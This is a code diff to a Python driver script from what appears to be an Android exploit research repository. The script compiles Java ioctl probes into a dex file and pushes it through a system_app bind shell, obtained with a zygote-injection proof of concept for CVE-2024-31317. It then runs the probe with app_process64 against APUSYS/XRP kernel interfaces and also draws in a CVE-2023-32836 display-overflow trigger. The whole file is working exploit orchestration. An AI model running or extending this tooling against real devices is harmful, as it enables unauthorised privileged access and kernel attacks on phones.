@@ -16,11 +16,15 @@ from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[2]
 APUSYS_JAVA = ROOT / "13-apusys-ioctl-surface" / "poc" / "ApusysIoctlProbe.java"
+XRP_WRAPPER_JAVA = (
+    ROOT / "13-apusys-ioctl-surface" / "poc" / "XrpWrapperInspect.java"
+)
 DRM_TRIGGER_JAVA = ROOT / "07-cve-2023-32836-display-overflow" / "poc" / "DrmTrigger.java"
 REBUILD_BIND_SHELL = (
     ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "rebuild_bind_shell.py"
 )
 DEFAULT_REMOTE_DEX = "/data/data/com.android.settings/cache/apusys_ioctl_probe.dex"
+DEFAULT_XRP_REMOTE_DEX = "/data/data/com.android.settings/cache/xrp_wrapper_inspect.dex"
 DEFAULT_RESULT_DIR = ROOT / "poc-run-results" / "2026-06-14-batch"
 
 
@@ -71,12 +75,21 @@ def find_android_jar(explicit):
     raise RuntimeError("android.jar not found; pass --android-jar or set ANDROID_JAR")
 
 
-def build_dex(android_jar, build_dir, dex_dir):
+def probe_sources(probe):
+    if probe == "apusys":
+        return "ApusysIoctlProbe", [DRM_TRIGGER_JAVA, APUSYS_JAVA]
+    if probe == "xrp-wrapper":
+        return "XrpWrapperInspect", [DRM_TRIGGER_JAVA, XRP_WRAPPER_JAVA]
+    raise RuntimeError(f"unknown probe: {probe}")
+
+
+def build_dex(android_jar, build_dir, dex_dir, probe):
     clean_dir(build_dir)
     clean_dir(dex_dir)
     build_dir.mkdir(parents=True)
     dex_dir.mkdir(parents=True)
 
+    _, sources = probe_sources(probe)
     run(
         [
             "javac",
@@ -88,9 +101,7 @@ def build_dex(android_jar, build_dir, dex_dir):
             str(android_jar),
             "-d",
             str(build_dir),
-            str(DRM_TRIGGER_JAVA),
-            str(APUSYS_JAVA),
-        ],
+        ] + [str(path) for path in sources],
         timeout=60,
     )
     class_files = [str(path) for path in build_dir.rglob("*.class")]
@@ -241,12 +252,19 @@ def capture_kernel_log(serial, pattern):
     return "\n".join(lines) + ("\n" if lines else "")
 
 
-def run_probe(port, remote_path, mode, timeout):
+def render_args(arg_text):
+    if not arg_text:
+        return ""
+    return " ".join(shlex.quote(part) for part in shlex.split(arg_text))
+
+
+def run_probe(port, remote_path, main_class, mode, timeout):
     remote_q = shlex.quote(remote_path)
-    mode_q = shlex.quote(mode)
+    rendered_args = render_args(mode)
     command = (
         f"id; cat /proc/self/attr/current; echo; md5sum {remote_q}; "
-        f"CLASSPATH={remote_q} app_process64 /system/bin ApusysIoctlProbe {mode_q}; "
+        f"CLASSPATH={remote_q} app_process64 /system/bin "
+        f"{shlex.quote(main_class)} {rendered_args}; "
         "sleep 2"
     )
     status, out = shell_command(port, command, timeout=timeout)
@@ -276,6 +294,7 @@ def main():
     parser.add_argument("--skip-rebuild-clean", action="store_true",
                         help="pass --skip-clean to rebuild_bind_shell.py")
     parser.add_argument("--android-jar")
+    parser.add_argument("--probe", choices=("apusys", "xrp-wrapper"), default="apusys")
     parser.add_argument("--mode", default="--run-cmd-vpu-guard")
     parser.add_argument("--remote-dex", default=DEFAULT_REMOTE_DEX)
     parser.add_argument("--build-dir", default="/tmp/apusys-build")
@@ -289,6 +308,10 @@ def main():
     parser.add_argument("--timeout", type=int, default=120)
     parser.add_argument("--skip-build", action="store_true")
     args = parser.parse_args()
+
+    main_class, _ = probe_sources(args.probe)
+    if args.probe == "xrp-wrapper" and args.remote_dex == DEFAULT_REMOTE_DEX:
+        args.remote_dex = DEFAULT_XRP_REMOTE_DEX
 
     android_jar = find_android_jar(args.android_jar)
     build_dir = Path(args.build_dir)
@@ -319,7 +342,9 @@ def main():
         dex_sha256 = hashlib.sha256(data).hexdigest()
     else:
         print(f"[*] Building dex with {android_jar}")
-        dex, dex_md5, dex_sha256 = build_dex(android_jar, build_dir, dex_dir)
+        dex, dex_md5, dex_sha256 = build_dex(
+            android_jar, build_dir, dex_dir, args.probe
+        )
     print(f"[*] dex={dex} md5={dex_md5} sha256={dex_sha256}")
 
     print(f"[*] Uploading through system_app shell to {args.remote_dex}")
@@ -336,11 +361,14 @@ def main():
         clear_logcat(args.serial)
 
     print(f"[*] Running {args.mode}")
-    status, output = run_probe(args.local_port, args.remote_dex, args.mode, args.timeout)
+    status, output = run_probe(
+        args.local_port, args.remote_dex, main_class, args.mode, args.timeout
+    )
 
     header = (
         f"command=CLASSPATH={args.remote_dex} app_process64 /system/bin "
-        f"ApusysIoctlProbe {args.mode}\n"
+        f"{main_class} {args.mode}\n"
+        f"probe={args.probe}\n"
         f"dex_md5={dex_md5}\n"
         f"dex_sha256={dex_sha256}\n"
         f"remote_dex={args.remote_dex}\n"
